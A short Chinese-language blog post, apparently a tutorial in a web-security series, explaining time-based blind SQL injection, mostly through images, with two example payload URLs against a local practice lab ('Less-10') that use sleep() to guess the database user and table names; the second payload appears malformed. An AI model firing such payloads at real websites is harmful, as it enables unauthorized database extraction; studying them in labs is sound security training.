---
layout: post
title: "1.3.2-SQL注入-SQL盲注-时间盲注"
date: 2018-06-23
category: web安全
tags: sql注入 sql盲注
---

## 时间盲注

### 时间盲注原理
![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/01.png)
![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/02.png)



### 时间盲注方法

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/03.png)
	
	http://localhost:90/Less-10/?id=1" and if(left(user(),1)='a',0,sleep(3))--+

	http://localhost:90/Less-10/?id=1" and if(left(select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='r',0,sleep(3))--+

时间注入脚本  

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/04.png)
![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/05.png)

--- 
## links
[时间盲注](https://mp.weixin.qq.com/s?__biz=MzIzNzExNzI5Ng==&mid=2648732982&idx=1&sn=159f2b13d7737232577ae11ccecb33d2&chksm=f0d95f29c7aed63f2e0aea215f57672f7282de08c47a1033e6b2cfe1fee5fb788b4c8de405c0&mpshare=1&scene=23&srcid=0702v4QOmQfViIjUPqq98LAc)
